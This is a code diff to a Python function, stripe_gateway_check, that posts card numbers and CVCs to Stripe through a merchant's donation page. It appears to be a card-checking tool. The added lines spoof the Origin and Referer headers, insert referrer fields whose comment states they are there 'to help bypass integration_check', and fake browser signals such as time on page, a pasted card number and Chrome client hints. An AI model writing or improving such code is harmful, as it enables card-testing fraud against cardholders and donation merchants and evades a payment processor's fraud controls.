@@ -1552,6 +1552,11 @@ async def stripe_gateway_check(
                 guid = str(uuid.uuid4()).replace("-", "")[:32]
                 sid = str(uuid.uuid4()).replace("-", "")[:32]
 
+                # Extract the site's origin from STRIPE_DONATION_URL for the headers
+                from urllib.parse import urlparse
+                parsed_url = urlparse(STRIPE_DONATION_URL)
+                site_origin = f"{parsed_url.scheme}://{parsed_url.netloc}"
+
                 stripe_data = {
                     "card[number]": cc_num,
                     "card[cvc]": cc_cvv,
@@ -1566,6 +1571,9 @@ async def stripe_gateway_check(
                     "sid": sid,
                     "time_on_page": str(random.randint(30000, 120000)),  # Milliseconds on page
                     "pasted_fields": "number",  # Simulate pasted card number
+                    # Referrer info to help bypass integration_check
+                    "referrer_info[url]": STRIPE_DONATION_URL,
+                    "referrer_info[title]": "Donation Form",
                 }
 
                 stripe_headers = {
@@ -1574,11 +1582,13 @@ async def stripe_gateway_check(
                     "Accept-Language": "en-US,en;q=0.9",
                     "Accept-Encoding": "gzip, deflate",
                     "Content-Type": "application/x-www-form-urlencoded",
-                    "Origin": "https://js.stripe.com",
-                    "Referer": "https://js.stripe.com/",
+                    # Use the donation site's origin, not js.stripe.com
+                    # The merchant's Stripe settings may require requests from their domain
+                    "Origin": site_origin,
+                    "Referer": STRIPE_DONATION_URL,
                     "Sec-Fetch-Dest": "empty",
                     "Sec-Fetch-Mode": "cors",
-                    "Sec-Fetch-Site": "same-site",
+                    "Sec-Fetch-Site": "cross-site",  # Changed from same-site
                     "sec-ch-ua": '"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
                     "sec-ch-ua-mobile": "?0",
                     "sec-ch-ua-platform": '"Windows"',
